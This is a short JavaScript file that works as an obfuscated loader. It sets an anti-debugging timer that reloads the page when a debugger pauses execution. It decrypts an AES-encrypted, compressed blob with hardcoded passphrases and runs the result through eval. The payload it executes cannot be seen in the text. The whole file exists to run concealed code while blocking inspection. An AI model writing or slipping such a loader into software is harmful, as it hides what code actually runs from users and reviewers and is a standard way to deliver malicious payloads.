CryptoJS = require("crypto-js");
pako = require("pako");
(function () {
  (function () {
    function detectDebugger() {
      const start = Date.now();
      debugger;
      if (Date.now() - start > 100) {
        window.location.reload();
      }
    }
    setInterval(detectDebugger, 1000);
  })();

  const encryptedData =
    "YzINlQyd/VE0CVvsHkWPEPsq/E97h7sCd5pIRQSmlam7UHsNqOOSEnImJ7Ek5kKj";
  const encryptedKey =
    "U2FsdGVkX1/tcgjnh1Hx4E/N8hQumRiU04TpCq/cv1xwzedK7QCtnKaOlZya/gk2pZEp3vilnDIANo04OfPvyw==";
  const encryptedIV =
    "U2FsdGVkX19Pq52Zl83t49a7BPK+3ju9RHU6ZCXqUMAokWqOyExfCAM4RKgmocY7sY9SDN/oCTVV2hwFIRClRg==";

  function decryptKeyAndIV() {
    const decryptedKey = CryptoJS.AES.decrypt(
      encryptedKey,
      "randomSaltForKey"
    ).toString(CryptoJS.enc.Utf8);
    const decryptedIV = CryptoJS.AES.decrypt(
      encryptedIV,
      "randomSaltForIV"
    ).toString(CryptoJS.enc.Utf8);
    return {
      key: CryptoJS.enc.Hex.parse(decryptedKey),
      iv: CryptoJS.enc.Hex.parse(decryptedIV),
    };
  }

  function decryptAndRun() {
    try {
      const { key, iv } = decryptKeyAndIV();

      const decrypted = CryptoJS.AES.decrypt(
        { ciphertext: CryptoJS.enc.Base64.parse(encryptedData) },
        key,
        { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
      );

      const compressedData = decrypted.toString(CryptoJS.enc.Latin1);
      const binaryString = Array.from(compressedData, (c) => c.charCodeAt(0));
      const decompressed = pako.inflate(new Uint8Array(binaryString), {
        to: "string",
      });

      eval(decompressed);
    } catch (e) {
      console.error("Decryption or execution failed:", e);
    }
  }

  decryptAndRun();
})();
